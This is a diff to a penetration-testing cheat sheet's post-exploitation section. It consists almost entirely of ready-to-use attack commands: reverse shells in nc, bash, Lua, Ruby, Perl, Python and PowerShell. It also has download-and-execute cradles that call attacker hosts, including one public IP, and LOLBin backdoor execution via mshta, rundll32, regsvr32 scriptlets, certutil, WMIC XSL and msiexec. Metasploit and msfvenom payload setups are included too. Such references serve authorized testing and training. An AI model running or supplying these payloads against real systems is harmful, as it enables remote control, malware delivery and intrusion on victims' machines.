@@ -146,7 +146,7 @@ b. kekeo # tgt::ask /pfx:<base64 pbx certificate> /user:<DC$ username> /domain:<
 
 # Post Exploitation
 # Linux
-Getting a shell:
+Getting a shell
 ```
 python -c 'import pty; pty.spawn("/bin/sh")'
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -164,12 +164,12 @@ vi: :set shell=/bin/bash:shell
 nmap: !sh
 ```
 ## Netcat
-Reverse shell:\
+Reverse shell\
 ```
 nc 172.16.1.100 443 -e /bin/sh
 nc.exe -e cmd.exe 172.16.1.100 443
 ```
-Sending file:
+Sending file
 ```
 nc -l -p 443 > out.file
 nc -w 3 10.0.0.1 443 < in.file
@@ -177,7 +177,7 @@ nc -w 3 10.0.0.1 443 < in.file
 
 
 ## Shell without Netcat
-Basic linux:
+Basic linux
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 443 >/tmp/f
 mknod backpipe p; nc 10.0.0.1 443 0<backpipe | /bin/bash 1>backpipe
@@ -186,27 +186,27 @@ mknod backpipe p; telnet 10.0.0.1 443 0<backpipe | /bin/bash 1>backpipe
 telnet 10.0.0.1 <1st_port> | /bin/bash | telnet 10.0.0.1 <2nd_port>
 wget -O /tmp/bd.php http://10.0.0.1/evil.php && php -f /tmp/bd.php
  ```
-LUA:
+LUA
 ```
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
-Ruby:
+Ruby
 ```
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
-Perl:
+Perl
 ```
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
-Python:
+Python
 ```
 C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
 ```
 ```
 python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.100.113”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
 ```
-Powershell:
+Powershell
 ```
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
@@ -217,18 +217,35 @@ echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/Power
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
-## Execution of backdoors
-Certutil:
-```
-certutil.exe -urlcache -split -f http://127.0.0.1:4444/beacon.exe C:\Windows\Temp\beacon.exe & C:\Windows\Temp\beacon.exe
-```
-MSHTA:
+# Windows Execution of backdoors
+## MSHTA
 ```
 mshta.exe vbscript:Close(Execute("GetObject(""script:http://127.0.0.1:4444/payload.sct"")"))
-mshta.exe http://127.0.0.1:4444/payload.hta
+mshta http://127.0.0.1:4444/payload.hta
+mshta http://webserver/payload.hta
 mshta.exe \\127.0.0.1\folder\payload.hta
+mshta \\webdavserver\folder\payload.hta
 ```
-SCT Payloads:
+MSTA to PS
+```
+<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
+```
+HTA
+```
+<html>
+<head>
+<HTA:APPLICATION ID="HelloExample">
+<script language="jscript">
+        var c = "cmd.exe /c calc.exe"; 
+        new ActiveXObject('WScript.Shell').Run(c);
+</script>
+</head>
+<body>
+<script>self.close();</script>
+</body>
+</html>
+```
+SCT Payloads
 ```
 <?XML version="1.0"?>
 <scriptlet>
@@ -252,7 +269,135 @@ SCT Payloads:
   </body>
 </html>
 ```
+MSHTA - SCT
+```
+<?XML version="1.0"?>
+<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
+<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
+<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
+<scriptlet>
+<public>
+</public>
+<script language="JScript">
+<![CDATA[
+    var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+]]>
+</script>
+</scriptlet>
+```
+Mshta - Metasploit
+```
+use exploit/windows/misc/hta_server
+msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
+msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
+msf exploit(windows/misc/hta_server) > exploit
+```
+```
+Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
+```
+## Rundll32
+```
+rundll32 \\webdavserver\folder\payload.dll,entrypoint
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
+```
+Rundll32 - SCT
+```
+<?XML version="1.0"?>
+<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
+<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
+<scriptlet>
+<public>
+</public>
+<script language="JScript">
+<![CDATA[
+    var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+]]>
+</script>
+</scriptlet>
+```
+## Regsvr32
+```
+regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
+regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
+```
+Regsvr32 - SCT
+```
+<?XML version="1.0"?>
+<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
+<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
+<scriptlet>
+<registration 
+    progid="PoC"
+    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
+    <script language="JScript">
+        <![CDATA[
+            var r = new ActiveXObject("WScript.Shell").Run("calc.exe");    
+        ]]>
+</script>
+</registration>
+</scriptlet>
+```
+Regsvr32 - Metasploit
+```
+use multi/script/web_delivery
+set target 3
+set payload windows/meterpreter/reverse/tcp
+set lhost 10.2.0.5
+run
+#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
+```
 
+## Certutil
+
+```
+certutil.exe -urlcache -split -f http://127.0.0.1:4444/beacon.exe C:\Windows\Temp\beacon.exe & C:\Windows\Temp\beacon.exe
+```
+```
+certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
+```
+```
+certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
+```
+## CScript/Wscript
+```
+powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
+```
+Cscript - Metasploit
+```
+msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
+```
+## MSIExec
+Attacker
+```
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
+python -m SimpleHTTPServer 80
+```
+Victim
+```
+victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
+```
+
+## WMIC
+```
+wmic os get /format:"https://webserver/payload.xsl"
+```
+Example XSL file
+```
+<?xml version='1.0'?>
+<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
+<output method="text"/>
+    <ms:script implements-prefix="user" language="JScript">
+        <![CDATA[
+            var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
+        ]]>
+    </ms:script>
+</stylesheet>
+```
+
+## Powershell
+```
+powershell -exec bypass -f \\webdavserver\folder\payload.ps1
+```
 
 <br /><br />
 
